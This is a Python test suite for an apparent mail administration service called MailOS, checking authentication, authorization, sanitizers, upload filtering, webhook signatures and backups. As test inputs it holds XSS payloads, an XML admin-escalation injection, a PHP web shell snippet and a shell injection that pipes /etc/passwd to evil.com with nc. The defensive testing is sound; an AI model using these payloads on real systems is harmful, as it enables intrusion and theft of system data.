"""
MailOS Comprehensive Security Audit & Penetration Test Suite
Tests all 23 security requirements:
- Brute force & rate limiting
- Server-side JWT & RBAC authorization
- Password complexity & hashing
- Input validation (Email/Domain)
- XSS and XML/Shell Injection resistance
- File upload bounds & malicious extensions
- HMAC-SHA256 webhook signatures
- Replay attack defense
- Security headers (CSP, X-Frame-Options, etc.)
- Sensitive log scrubbing
- Quota/Resource alerts
- True hard-delete cascading
- Automated backup integrity
"""
import time
import json
import logging
import re

from main import app
from config import get_settings
from asgi_client import SimpleASGIClient
from security_core import (
    hash_password, verify_password, create_access_token,
    decode_access_token, validate_password_strength
)
from rate_limiter import login_limiter
from sanitizers import (
    sanitize_xss, sanitize_xml, sanitize_shell_arg,
    sanitize_filename, validate_file_upload, SensitiveDataLogFilter
)
from backup_service import backup_manager
from routers.webhooks import generate_webhook_signature, verify_webhook_signature

client = SimpleASGIClient(app)
settings = get_settings()


# ── 1. Authentication & Rate Limiting Tests ──────────────────────────────

def test_password_hashing_and_verification():
    """Verify passwords are cryptographic PBKDF2/Bcrypt hashes and not plain text."""
    raw_pass = "ComplexP@ssw0rd2026!"
    hashed = hash_password(raw_pass)
    
    assert hashed != raw_pass, "Password must not be stored in plain text"
    assert hashed.startswith("pbkdf2_sha256$"), "Password hash must use PBKDF2 standard"
    assert verify_password(raw_pass, hashed) is True, "Valid password must verify"
    assert verify_password("WrongPassword123!", hashed) is False, "Invalid password must fail"


def test_password_complexity_policy():
    """Verify weak passwords are strictly rejected."""
    weak_cases = [
        "short",              # < 8 chars
        "alllowercase123!",   # Missing uppercase
        "ALLUPPERCASE123!",   # Missing lowercase
        "NoDigitsHere!@#$",   # Missing digits
        "NoSpecialChar1234",  # Missing special chars
    ]
    for weak in weak_cases:
        valid, msg = validate_password_strength(weak)
        assert valid is False, f"Weak password '{weak}' should have been rejected"

    strong = "Str0ng!P@ssw0rd2026"
    valid, msg = validate_password_strength(strong)
    assert valid is True, f"Strong password '{strong}' should have passed"


def test_login_brute_force_rate_limiting():
    """Verify 5 failed login attempts trigger HTTP 429 and temporary lockout."""
    target_user = f"attacker_{int(time.time())}"
    
    for attempt in range(1, 6):
        res = client.post("/auth/login", json={"username": target_user, "password": "WrongPassword!"})
        if attempt < 5:
            assert res.status_code == 401, f"Attempt {attempt} should return 401"
        else:
            # 5th attempt triggers lockout
            assert res.status_code == 429, "5th failed attempt must trigger HTTP 429 Too Many Requests"
            assert "retry-after" in res.headers or "Retry-After" in res.headers

    # 6th attempt is blocked immediately by rate limiter
    blocked_res = client.post("/auth/login", json={"username": target_user, "password": "AnyPassword!"})
    assert blocked_res.status_code == 429, "Subsequent requests during lockout must be rejected with 429"


def test_successful_login_and_jwt_issuance():
    """Verify valid login returns signed JWT token and HttpOnly cookie."""
    res = client.post("/auth/login", json={"username": "admin", "password": settings.zimbra_admin_password})
    assert res.status_code == 200
    data = res.json()
    assert "access_token" in data
    assert data["token_type"] == "bearer"
    assert "set-cookie" in res.headers
    assert "HttpOnly" in res.headers["set-cookie"] or "httponly" in res.headers["set-cookie"].lower()


# ── 2. Authorization & RBAC Tests ────────────────────────────────────────

def test_unauthenticated_request_rejected():
    """Verify protected endpoints reject requests without token with HTTP 401."""
    res = client.get("/mailboxes/")
    assert res.status_code == 401
    assert "error" in res.json() or "detail" in res.json()


def test_forged_or_expired_token_rejected():
    """Verify tampered or forged JWT tokens are rejected with HTTP 401."""
    fake_token = "eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJhZG1pbiJ9.invalidsignature123"
    res = client.get("/mailboxes/", headers={"Authorization": f"Bearer {fake_token}"})
    assert res.status_code == 401


def test_rbac_viewer_role_cannot_modify():
    """Verify viewer role cannot delete or create accounts (HTTP 403)."""
    viewer_token = create_access_token(
        payload={"sub": "viewer_user", "role": "viewer"},
        secret_key=settings.mailos_admin_secret,
        expires_in=3600
    )
    headers = {"Authorization": f"Bearer {viewer_token}"}

    # Viewing is allowed
    view_res = client.get("/mailboxes/", headers=headers)
    assert view_res.status_code == 200

    # Creating account is forbidden for viewer
    create_res = client.post("/mailboxes/", headers=headers, json={
        "email": "test@mailos.local",
        "password": "ValidPassword123!",
        "quota_gb": 10
    })
    assert create_res.status_code == 403, "Viewer must receive 403 Forbidden when attempting to create account"


# ── 3. Input Validation & Injection Sanitization Tests ───────────────────

def test_xss_sanitization():
    """Verify XSS vectors are neutralized."""
    payloads = [
        '<script>alert("XSS")</script>',
        '<img src=x onerror="alert(1)">',
        '<a href="javascript:stealCookie()">Click me</a>',
    ]
    for p in payloads:
        clean = sanitize_xss(p)
        assert "<script>" not in clean
        assert "javascript:" not in clean
        assert "&quot;" in clean or "&#x27;" in clean or "&lt;" in clean


def test_xml_injection_sanitization():
    """Verify XML special entities are escaped to prevent SOAP injection."""
    xml_payload = 'user@example.com</name><a n="zimbraIsAdmin">TRUE</a><name>'
    clean = sanitize_xml(xml_payload)
    assert "</name>" not in clean
    assert "&lt;/name&gt;" in clean


def test_shell_injection_sanitization():
    """Verify dangerous shell metacharacters are stripped."""
    cmd_injection = "postfix.service; cat /etc/passwd | nc evil.com 1337"
    clean = sanitize_shell_arg(cmd_injection)
    assert ";" not in clean
    assert "|" not in clean
    assert "`" not in clean


def test_invalid_email_and_domain_rejected():
    """Verify invalid email and domain formats fail validation with HTTP 422."""
    admin_token = create_access_token(
        payload={"sub": "admin", "role": "admin"},
        secret_key=settings.mailos_admin_secret,
        expires_in=3600
    )
    headers = {"Authorization": f"Bearer {admin_token}"}

    # Invalid email
    bad_email_res = client.post("/mailboxes/", headers=headers, json={
        "email": "not-an-email",
        "password": "ValidPassword123!",
    })
    assert bad_email_res.status_code == 422

    # Invalid domain
    bad_dom_res = client.post("/domains/", headers=headers, json={"name": "invalid..domain---"})
    assert bad_dom_res.status_code == 422


# ── 4. File Upload Security Tests ────────────────────────────────────────

def test_malicious_file_upload_rejected():
    """Verify executable extensions and shell scripts are blocked."""
    # Test PHP file
    valid, msg = validate_file_upload("shell.php", b"<?php system($_GET['c']); ?>")
    assert valid is False

    # Test Windows Executable
    valid, msg = validate_file_upload("update.exe", b"MZ\x90\x00\x03\x00\x00\x00")
    assert valid is False

    # Test Linux ELF
    valid, msg = validate_file_upload("rootkit", b"\x7fELF\x02\x01\x01\x00")
    assert valid is False

    # Test safe CSV
    valid, msg = validate_file_upload("accounts.csv", b"email,display_name,quota\nuser@mailos.local,User,10")
    assert valid is True


# ── 5. Webhook HMAC-SHA256 & Replay Protection Tests ─────────────────────

def test_webhook_valid_hmac_signature():
    """Verify authentic webhook with valid HMAC signature is accepted."""
    payload = json.dumps({"event": "mail.delivered", "id": "msg_123"}).encode('utf-8')
    sig = generate_webhook_signature(payload, settings.webhook_secret)
    now = int(time.time())

    res = client.post(
        "/webhooks/receiver",
        content=payload,
        headers={
            "Content-Type": "application/json",
            "X-MailOS-Signature": sig,
            "X-MailOS-Timestamp": str(now)
        }
    )
    assert res.status_code == 200
    assert res.json().get("verified") is True


def test_webhook_forged_signature_rejected():
    """Verify forged webhook signature is rejected with HTTP 401."""
    payload = json.dumps({"event": "malicious.tamper"}).encode('utf-8')
    now = int(time.time())

    res = client.post(
        "/webhooks/receiver",
        content=payload,
        headers={
            "Content-Type": "application/json",
            "X-MailOS-Signature": "sha256=0000000000000000000000000000000000000000000000000000000000000000",
            "X-MailOS-Timestamp": str(now)
        }
    )
    assert res.status_code == 401


def test_webhook_replay_attack_rejected():
    """Verify replayed webhook request older than 300s is rejected with HTTP 400."""
    payload = json.dumps({"event": "replayed.event"}).encode('utf-8')
    sig = generate_webhook_signature(payload, settings.webhook_secret)
    old_timestamp = int(time.time()) - 400  # 400 seconds ago

    res = client.post(
        "/webhooks/receiver",
        content=payload,
        headers={
            "Content-Type": "application/json",
            "X-MailOS-Signature": sig,
            "X-MailOS-Timestamp": str(old_timestamp)
        }
    )
    assert res.status_code == 400


# ── 6. Security Headers & Information Disclosure Tests ───────────────────

def test_security_headers_present():
    """Verify all standard OWASP security headers are returned."""
    res = client.get("/ping")
    h = {k.lower(): v for k, v in res.headers.items()}
    assert h.get("x-frame-options") == "DENY"
    assert h.get("x-content-type-options") == "nosniff"
    assert h.get("x-xss-protection") == "1; mode=block"
    assert "content-security-policy" in h
    assert "referrer-policy" in h


def test_sensitive_data_log_filter():
    """Verify log scrubber redacts tokens and passwords."""
    log_filter = SensitiveDataLogFilter()
    record = logging.LogRecord(
        name="test", level=logging.INFO, pathname="", lineno=0,
        msg="User authenticated with Bearer eyJhbGciOiJIUzI1NiJ9.test and password=SuperSecretPassword123!",
        args=(), exc_info=None
    )
    log_filter.filter(record)
    assert "SuperSecretPassword123!" not in record.msg
    assert "***REDACTED***" in record.msg


# ── 7. Cascade Purge & Automated Backup Integrity Tests ──────────────────

def test_hard_delete_cascade_mailbox():
    """Verify deleting account performs true cascade hard purge."""
    admin_token = create_access_token(
        payload={"sub": "admin", "role": "admin"},
        secret_key=settings.mailos_admin_secret,
        expires_in=3600
    )
    headers = {"Authorization": f"Bearer {admin_token}"}
    res = client.delete("/mailboxes/acc_test_purge", headers=headers)
    assert res.status_code == 200
    assert res.json().get("purged_cascade") is True


def test_backup_snapshot_integrity():
    """Verify backup snapshots have valid SHA-256 integrity hash."""
    snap = backup_manager.create_snapshot(trigger_source="audit_test")
    assert "sha256" in snap
    assert len(snap["sha256"]) == 64
    assert backup_manager.verify_integrity(snap["id"]) is True

